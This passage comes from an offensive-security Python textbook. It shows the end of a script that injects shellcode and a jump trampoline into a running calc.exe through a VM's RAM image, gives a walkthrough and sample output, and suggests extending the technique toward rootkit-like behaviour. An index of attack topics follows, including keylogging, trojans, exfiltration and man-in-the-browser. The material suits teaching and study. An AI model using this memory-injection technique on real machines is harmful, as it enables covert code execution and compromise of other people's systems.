tramp += "\xff\xe3"
if trampoline_offset is not None:
break
except:
pass
fd.close()
Automating Offensive Forensics 159
# check for our target code location
if page[0] <= equals_button and ¬
 equals_button < ((page[0] + page[1])-7):
print "[*] Found our trampoline target at: 0x%08x" ¬
% (physical)
# calculate virtual offset
 v_offset = equals_button - page[0]
# now calculate physical offset
trampoline_offset = physical + v_offset
print "[*] Found our trampoline target at: 0x%08x" ¬
% (trampoline_offset)
if slack_space is not None:
break
print "[*] Writing trampoline..."
 fd = open(memory_file, "r+")
fd.seek(trampoline_offset)
fd.write(tramp)
fd.close()
print "[*] Done injecting code."
All right! Let’s walk through what all of this code does. When we iter-
ate over each page, the code returns a two-member list where page[0] is the
address of the page and page[1] is the size of the page in bytes. As we walk
through each page of memory, we first find the physical offset (remember
the offset in the RAM image on disk) u of where the page lies. We then
open the RAM image v, seek to the offset of where the page is, and then
read in the entire page of memory. We then attempt to find a chunk of
NULL bytes w the same size as our shellcode; this is where we write the
shellcode into the RAM image x. After we’ve found a suitable spot and
injected the shellcode, we take the address of our shellcode and create a
small chunk of x86 opcodes y. These opcodes yield the following assembly:
mov ebx, ADDRESS_OF_SHELLCODE
jmp ebx
Keep in mind that you could use Volatility’s disassembly features to
ensure that you disassemble the exact number of bytes that you require
for your jump, and restore those bytes in your shellcode. I’ll leave this as
a homework assignment.
160 Chapter 11
The final step of our code is to test whether our = button function
resides in the current page that we’re iterating over . If we find it, we
calculate the offset  and then write out our trampoline . We now have
our trampoline in place that should transfer execution to the shellcode
we placed in the RAM image.
Kicking the Tires
The first step is to close Immunity Debugger if it’s still running and close
any instances of calc.exe. Now fire up calc.exe and run your code injection
script. You should see output like this:
$ python code_inject.py
[*] Found calc.exe with PID 1936
[*] Hunting for physical offsets...please wait.
[*] Found good shellcode location!
[*] Virtual address: 0x00010817
[*] Physical address: 0x33155817
[*] Injecting shellcode.
[*] Found our trampoline target at: 0x3abccd51
[*] Writing trampoline...
[*] Done injecting code.
Beautiful! It should show that it found all of the offsets, and injected
the shellcode. To test it, simply drop into your VM and do a quick 3+3 and
hit the = button. You should see a message pop up!
Now you can try to reverse engineer other applications or services aside
from calc.exe to try this technique against. You can also extend this technique
to try manipulating kernel objects which can mimic rootkit behavior. These
techniques can be a fun way to become familiar with memory forensics, and
they’re also useful for situations where you have physical access to machines
or have popped a server hosting numerous VMs.
Automating Offensive Forensics 161
inDex
Note: Page numbers followed by f, in HTML form authentication,
n, or t indicate figures, notes, and 69–74
tables respectively. administrator login form,
69–70
general settings, 70–71
A
HTML parsing class, 72–73
Address Resolution Protocol. See ARP pasting in wordlist, 73
cache poisoning primary brute-forcing class,
AdjustTokenPrivileges function, 142 71–72
AF_INET parameter, 10 request flow, 70
ARP (Address Resolution Protocol) testing, 74
cache poisoning, 51–55 build_wordlist function, 73
adding supporting functions, Burp Extender API, 75–99
53–54 creating password-guessing
coding poisoning script, 52–53 wordlist, 93–99
inspecting cache, 51 converting selected HTTP
testing, 54–55 traffic into wordlist, 95–96
functionality to display wordlist,
96–97
B
testing, 97–99, 97f–99f
BHPFuzzer class, 81–82 creating web application fuzzers,
bing_menu function, 89–90 78–87
Bing search engine, 87–93 accessing Burp documentation,
defining extender class, 88–89 78–81
functionality to parse results, 90–91 implementing code to meet
functionality to perform query, requirements, 79–82
89–90 loading extension, 83–84,
testing, 91–92, 91f–93f 83f–84f
bing_search function, 89–90 simple fuzzer, 82–83
Biondi, Philippe, 47 using extension in attacks,
BitBlt function, 116 84–87, 85f–87f
Browser Helper Objects, 128–135 installing, 76–77, 77f
brute force attacks interfacing with Bing API to show
on directories and file locations, all virtual hosts, 87–93
65–68 defining extender class, 88–89
applying list of extensions to functionality to parse results,
test for, 67–68 90–91
creating list of extensions, 68 functionality to perform query,
creating Queue objects out of 89–90
wordlist files, 66 testing, 91–92, 91f–93f
setting up wordlist, 68 Jython standalone JAR file, 76, 77f
testing, 68 BurpExtender class, 79–80, 88–90
C opening blank Python file, 5f
setting breakpoints, 5
Cain and Abel, 74
setting script for debugging,
CANVAS, 117, 117n
6, 6f
channel method, 32
viewing stack trace, 6, 7f
ClientConnected message, 28–29
Errors tab, Burp, 84
code injection
exfiltrate function, 132–133
offensive forensics automation,
exfiltration, 128–135
156–161
encryption routines, 129–130
Windows privilege escalation,
key generation script, 133–134
147–149
login functionality, 131
config directory, 102
posting functionality, 132
connect_to_github function, 105–106
supporting functions, 129
Content-Length header, 127
testing, 134–135
count parameter, 48
Extender tab, Burp, 83, 84f, 99f
createMenuItem function, 88–89
extract_image function, 58–59
createNewInstance function, 79–80
CreateProcess function, 139
CredRequestHandler class, 127 F
ctypes module, 39–41 feed method, 71–72
Fidao, Chris, 59
D FileCookieJar class, 71–72
filter parameter, 48
data directory, 102
find_module function, 107
Debug Probe tab, WingIDE, 8
forward SSH tunneling, 30, 30f
Destination Unreachable message, 42, 43f
Frisch, Dan, 138
dir_bruter function, 67
DirBuster project, 65
display_wordlist function, 96–97 G
GDI (Windows Graphics Device
E Interface), 115–116
GetAsyncKeyState function, 120
easy_install function, 3
get_file_contents function, 106
El Jefe project, 139
GetForeGroundWindow function, 112–113
encrypt_post function, 129–130
getGeneratorName function, 79–80
encrypt_string function, 130
get_http_headers function, 58–59
environment setup, 1–8
GetLastInputInfo function, 119
Kali Linux, 2–3
get_mac function, 53–54
default username and
getNextPayload function, 81–82
password, 2
GetOwner function, 140–141
desktop environment, 2f
GET requests, 62
determining version, 2
GetTickCount function, 119
downloading image, 2
get_trojan_config function, 106
general discussion, 2
GetWindowDC function, 116
WingIDE, 3–8
GetWindowTextA function, 112–113
accessing, 4f
GetWindowThreadProcessId function,
fixing missing dependencies, 4
112–113
general discussion, 3–4
get_words function, 95–96
inspecting and modifying local
github3 module, 3
variables, 8, 8f
GitHub-aware trojans, 101–109
installing, 4
account setup, 102
164 Index
building, 105–108 IIntruderPayloadGenerator class, 78–82
configuring, 104 IIntruderPayloadGeneratorFactory class,
creating modules, 103 78–80
hacking import functionality, image carving script, 55–60
107–108 adding facial detection code, 59
improvements and enhance- adding supporting functions,
ments to, 109 58–59
testing, 108–109 coding processing script, 56–57
GitImporter class, 107 testing, 59–60
imageinfo plugin, 152
IMAP credentials, stealing, 48, 50
H
Immunity Debugger, 156–157, 156n
handle_client function, 12–13 imp module, 107
handle_comment function, 94–95 __init__ method, 41
handle_data function, 73, 94–95 inject_code function, 148–149
handle_endtag function, 73 input/output control (IOCTL), 37, 37n
handle_starttag function, 72–73 input tags, 72–73
HashDump object, 155 Internet Explorer COM automation,
hashdump plugin, 153 123–135
hasMorePayloads function, 80–82 exfiltration, 128–135
hex dumping function, 23–24 encryption routines, 129–130
hivelist plugin, 153 key generation script, 133–134
HookManager class, 114 login functionality, 131
HTML form authentication, brute posting functionality, 132
forcing, 69–74 supporting functions, 129
administrator login form, 69–70 testing, 134–135
general settings, 70–71 man-in-the-browser attacks,
HTML parsing class, 72–73 124–128
pasting in wordlist, 73 creating HTTP server, 127–128
primary brute-forcing class, 71–72 defined, 124
request flow, 70 main loop, 125–127
testing, 74 support structure for, 124–125
HTMLParser class, 69, 72–73, 94–95 testing, 128
HTTP history tab, Burp, 85, 85f waiting for browser
functionality, 126–127
I Intruder tab, Burp, 85, 86f
Intruder tool, Burp, 78
IBurpExtender class, 79–80, 88–89
IOCTL (input/output control), 37, 37n
ICMP message decoding routine,
IP header decoding routine, 38–42
42–46
avoiding bit manipulation, 39–40
Destination Unreachable message,
human-readable protocol, 40–41
42–43, 43f
testing, 41–42
length calculation, 44
typical IPv4 header structure, 39f
message elements, 42
sending UDP datagrams and
J
interpreting results, 44–45
testing, 45–46 Janzen, Cliff, 138
IContextMenuFactory class, 88–89 JSON format, 104
IContextMenuInvocation class, 88–89 Jython standalone JAR file, 76, 77f
Iexplore.exe process, 128
iface parameter, 48
Index 165
K modules directory, 102
mutate_payload function, 82
Kali Linux
default username and password, 2
desktop environment, 2f N
determining version, 2 Nathoo, Karim, 127
downloading image, 2 netaddr module, 44, 46
general discussion, 2 netcat-like functionality, 13–20
installing packages, 3 adding client code, 15–16
KeyDown event, 114 calling functions, 14–15
keylogging, 112–115 command execution functionality,
KeyStroke function, 114 17–19
Khrais, Hussam, 27n command shell, 17–19
Kuczmarski, Karol, 107n creating main function, 14–15
creating primary server loop, 16–17
L creating stub function, 16–17
file upload functionality, 17–19
LASTINPUTINFO structure, 119
importing libraries, 13
load_module function, 107
setting global variables, 13
login_form_index function, 124–125
testing, 19–20
login_to_tumblr function, 131
network basics, 9–33
logout_form function, 124–125
creating TCP clients, 10–11
logout_url function, 124–125
creating TCP proxies, 20–25
hex dumping function, 23–24
M proxy_handler function, 22–23
reasons for, 20
mangle function, 96–97
testing, 25
man-in-the-browser (MitB) attacks,
creating TCP servers, 12–13
124–128
creating UDP clients, 11
creating HTTP server, 127–128
netcat-like functionality. See netcat-
defined, 124
like functionality
main loop, 125–127
SSH tunneling, 30–33
support structure for, 124–125
forward, 30, 30f
testing, 128
reverse, 30–33, 31f, 33f
waiting for browser functionality,
testing, 33
126–127
SSH with Paramiko, 26–30
man-in-the-middle (MITM) attacks,
creating SSH server, 28–29
51–55
installing Paramiko, 26
adding supporting functions,